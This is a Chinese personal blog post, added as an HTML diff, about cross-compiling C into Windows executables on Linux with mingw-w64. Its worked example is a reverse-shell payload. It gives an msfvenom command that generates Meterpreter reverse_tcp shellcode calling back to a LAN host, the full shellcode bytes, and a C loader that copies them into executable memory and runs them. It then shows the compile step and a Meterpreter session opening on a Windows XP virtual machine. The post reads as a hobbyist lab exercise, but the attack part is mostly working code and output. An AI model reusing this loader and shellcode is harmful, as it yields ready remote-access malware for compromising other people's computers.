@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html><head>
+<title>尝试在 Linux 下编译 exe 可执行文件</title>
+
+
+
+
+<meta charset="utf-8">
+<meta name="X-UA-Compatible" content="IE=edge">
+<meta name="google-site-verification" content="">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+<meta content="telephone=no" name="format-detection">
+<meta name="description" content="试着在 Linux 下将 C 语言代码文件编译成 Windows 可以跑的 exe 文件~">
+<meta name="renderer" content="webkit">
+<meta name="theme-color" content="#ffffff">
+
+
+
+
+
+
+
+
+
+
+
+<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
+
+
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="http://weepingdogel.github.io/scss/journal.min.3f72a5fc8f5b5dd732a4b476aced0eece2156958d9d414316494ddb10593ddf7.css" integrity="sha256-P3Kl/I9bXdcypLR2rO0O7OIVaVjZ1BQxZJTdsQWT3fc=" media="screen">
+
+
+
+<link rel="stylesheet" href="http://weepingdogel.github.io/scss/dark-mode.min.f7c2efa7183435a6bd1842f91c541481c7a5137b5991629a870f24e4a516ad4b.css" integrity="sha256-98Lvpxg0Naa9GEL5HFQUgcelE3tZkWKahw8k5KUWrUs=" media="screen">
+
+
+<script src="/vendor/js/loadCSS.js"></script>
+<script>
+  loadCSS("https://fonts.googleapis.com/css?family=Fira+Mono|Material+Icons");
+</script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8465793241118966"
+     crossorigin="anonymous"></script>
+
+
+
+
+
+  <script src="/js/toc.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+    	<div id="app"><div id="sideContainer" class="side-container">
+    
+    <a class="a-block nav-head false" href="http://weepingdogel.github.io/">
+    
+        <div class="nav-title">
+            WeepingDogel
+        </div>
+        
+    </a>
+
+    <div class="nav-link-list">
+        
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/posts/">
+                文章
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/tags/">
+                标签
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/categories/">
+                分类
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/about/">
+                关于
+            </a>
+            
+        
+    </div>
+
+    
+
+    <div class="nav-footer">
+        
+ <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a>  <a href="https://amazingrise.net">Rise</a>
+<br>
+ <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	2021 WeepingDogel
+	
+
+    </div>
+    
+</div><div id="extraContainer" class="extra-container">
+    
+    
+    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>-  -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%ba%8f" onclick="onNavClick(`#序-nav`)" id="序-nav">
+									序
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#mingw-w64" onclick="onNavClick(`#mingw-w64-nav`)" id="mingw-w64-nav">
+									mingw-w64
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%bc%80%e5%a7%8b%e7%bc%96%e8%af%91" onclick="onNavClick(`#开始编译-nav`)" id="开始编译-nav">
+									开始编译
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%a3%80%e9%aa%8c" onclick="onNavClick(`#检验-nav`)" id="检验-nav">
+									检验
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+    
+    <div class="pagination">
+        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
+            <i class="material-icons pagination-action-icon">
+                keyboard_arrow_up
+            </i>
+        </a>
+        
+        <a type="button" class="pagination-action" id="darkModeToggleButton">
+            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
+                dark_mode
+            </span>
+        </a>
+        
+        
+    </div>
+</div>
+<div class="single-column-drawer-container" id="drawer"
+     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
+    <div class="drawer-content">
+        <div class="drawer-menu">
+            
+            
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/posts/">
+                    文章
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/tags/">
+                    标签
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/categories/">
+                    分类
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/about/">
+                    关于
+                </a>
+                
+            
+            
+            <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>-  -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%ba%8f" onclick="onNavClick(`#序-nav`)" id="序-nav">
+									序
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#mingw-w64" onclick="onNavClick(`#mingw-w64-nav`)" id="mingw-w64-nav">
+									mingw-w64
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%bc%80%e5%a7%8b%e7%bc%96%e8%af%91" onclick="onNavClick(`#开始编译-nav`)" id="开始编译-nav">
+									开始编译
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%a3%80%e9%aa%8c" onclick="onNavClick(`#检验-nav`)" id="检验-nav">
+									检验
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+            
+        </div>
+    </div>
+</div>
+<transition name="fade">
+    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
+</transition>
+<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
+    <div id="navBackground" class="nav-background"></div>
+    <div class="container container-narrow nav-content">
+        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
+            <i class="material-icons">
+                menu
+            </i>
+        </button>
+        <a id="navTitle" class="navbar-brand" href="http://weepingdogel.github.io/">
+            WeepingDogel
+        </a>
+        
+        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
+            <i class="material-icons" id="darkModeToggleIcon2">
+                dark_mode
+            </i>
+        </button>
+        
+    </div>
+</nav>
+<div class="single-column-header-container" id="pageHead"
+     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
+    <a href="http://weepingdogel.github.io/">
+        <div class="single-column-header-title">WeepingDogel</div>
+        
+
+    </a>
+</div>
+
+            <div id="content">
+                <div id="streamContainer" class="stream-container">
+
+    <div class="post-list-container post-list-container-shadow">
+        <div class="post">
+            
+            
+            
+
+            <div class="post-head-wrapper-text-only"
+                
+            >
+                <div class="post-title">
+                    尝试在 Linux 下编译 exe 可执行文件
+                    
+                    <div class="post-subtitle">
+                        试着在 Linux 下将 C 语言代码文件编译成 Windows 可以跑的 exe 文件~
+                    </div>
+                    
+                    <div class="post-meta">
+                        
+                        <time itemprop="datePublished">
+                            
+                        </time>
+                        
+
+                        
+                            <i class="material-icons" style="">folder</i>
+                                <a href="/categories/">[编程]</a>
+                                &nbsp;
+                        
+
+                        
+                            <i class="material-icons" style="">label</i>
+                            
+                                <a href="/tags/c-%E8%AF%AD%E8%A8%80">C 语言</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91">交叉编译</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E7%BC%96%E7%A8%8B">编程</a>
+                                &nbsp;
+                            
+                                <a href="/tags/gcc">gcc</a>
+                                &nbsp;
+                            
+                                <a href="/tags/windows">Windows</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E9%BB%91%E5%AE%A2">黑客</a>
+                                &nbsp;
+                            
+                        
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="post-body-wrapper">
+                
+                <div class="post-body" v-pre>
+                
+                    <h1 id="序">序</h1>
+<p>最近一直在想有没有什么办法可以在 Linux 环境下编译 Windows 中可以运行的 exe 文件，由于自己没有 Windows 环境， 就算开虚拟机也多多少少有些不方便..</p>
+<p>于是就去谷歌了一下.. 发现办法是有的.</p>
+<p>这种办法叫做交叉编译, 要用到交叉编译器</p>
+<p>我们看看维基百科上怎么说</p>
+<blockquote>
+<p>交叉编译器（英语：Cross compiler）是指一个在某个系统平台下可以产生另一个系统平台的可执行文件的编译器。交叉编译器在目标系统平台（开发出来的应用程序序所运行的平台）难以或不容易编译时非常有用。</p>
+<p>交叉编译器的存在对于从一个开发主机为多个平台编译代码是非常有必要的。直接在平台上编译有时行不通，例如在一个嵌入式系统的单片机 ，因为它们没有操作系统，所以直接编译行不通。</p>
+<p>交叉编译器和源代码至源代码编译器不同，交叉编译器用于二进制代码的跨平台软件开发，而源到源编译器是将某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器，但两者都是编程工具。</p>
+<p>rel: <a href="https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8">https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8</a></p>
+</blockquote>
+<p>概念就是这样..</p>
+<h1 id="mingw-w64">mingw-w64</h1>
+<p>这大概是个交叉编译器了</p>
+<p>看看官网怎么说</p>
+<blockquote>
+<p>Mingw-w64 is an advancement of the original mingw.org project, created to support the GCC compiler on Windows systems. It has forked it in 2007 in order to provide support for 64 bits and new APIs. It has since then gained widespread use and distribution.</p>
+<p>rel: <a href="https://mingw-w64.org/doku.php">https://mingw-w64.org/doku.php</a></p>
+</blockquote>
+<p>好的接下来我们就安装它， 这里 Arch 就直接从 pacman 装上了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ sudo pacman -S mingw-w64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/2021-04-26-14-32-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="">
+<img src="/img/2021-04-26-14-33-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
+<h1 id="开始编译">开始编译</h1>
+<p>那么， 装完之后就可以开始编译了</p>
+<p>我打算编译一个 payload 试试看，嘿嘿</p>
+<p>首先我们先用 <code>msfvenom</code> 生成一段 <code>shellcode</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=3333 -f c &gt;&gt; shellcode.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20\x50\x01\xd3</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x6d\xa6\x24\x38\x68\x02</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x35\x16\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p>然后编写我们的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x70\x68\x02</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;啊哈！你中毒啦！&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//ShellExecute(NULL, _T(&#34;open&#34;), _T(&#34;explorer.exe&#34;), _T(&#34;https://www.baiud.com&#34;), NULL, SW_SHOW);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">LPVOID</span> <span class="n">Memory</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">memcpy</span><span class="p">(</span><span class="n">Memory</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">Memory</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>PS: 这是抄的(bushi)</p>
+</blockquote>
+<p>接下来进行编译</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ i686-w64-mingw32-gcc-10.2.0 payload.c -o payload.exe -v
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>没有任何报错之后，丢进虚拟机里运行, 如果 meterpreter 能够上线则说明编译是有效的</p>
+<h1 id="检验">检验</h1>
+<p><img src="/img/2021-05-07-18-18-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.112:3333 
+</span></span><span class="line"><span class="cl">[*] Sending stage (175174 bytes) to 192.168.0.113
+</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.0.112:3333 -&gt; 192.168.0.113:1045) at 2021-05-07 18:18:17 +0800
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; sysinfo
+</span></span><span class="line"><span class="cl">Computer        : CHINA-74ED62096
+</span></span><span class="line"><span class="cl">OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+</span></span><span class="line"><span class="cl">Architecture    : x86
+</span></span><span class="line"><span class="cl">System Language : zh_CN
+</span></span><span class="line"><span class="cl">Domain          : WORKGROUP
+</span></span><span class="line"><span class="cl">Logged On Users : 2
+</span></span><span class="line"><span class="cl">Meterpreter     : x86/windows
+</span></span><span class="line"><span class="cl">meterpreter &gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们直接丢进去跑&hellip;</p>
+<p>emmm 虽然字乱码了。</p>
+<p>不过连接是建立了，那么说明编译是有效的～</p>
+
+                    
+                    <HR width="100%" id="EOF">
+		    <p style="color:#777;"></p>
+                    
+                </div>
+            </div>
+            
+            
+            <nav class="post-pagination">
+
+                
+                <a class="newer-posts" href="http://weepingdogel.github.io/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/">
+			<br>Python 学习笔记——ArgParse
+                </a>
+                
+                
+                
+                <a class="older-posts" href="http://weepingdogel.github.io/%E5%AD%A6gtk%E8%AE%B0/">
+			<br>学 GTK 记
+                </a>
+                
+            </nav>
+            <div class="post-comment-wrapper">
+                
+
+
+
+
+
+
+
+
+
+
+            </div>
+        </div>
+    </div>
+
+
+                    </div>
+            </div><div id="single-column-footer">
+ <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a>  <a href="https://amazingrise.net">Rise</a>
+<br>
+ <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	2021 WeepingDogel
+	
+</div>
+            </div>
+    
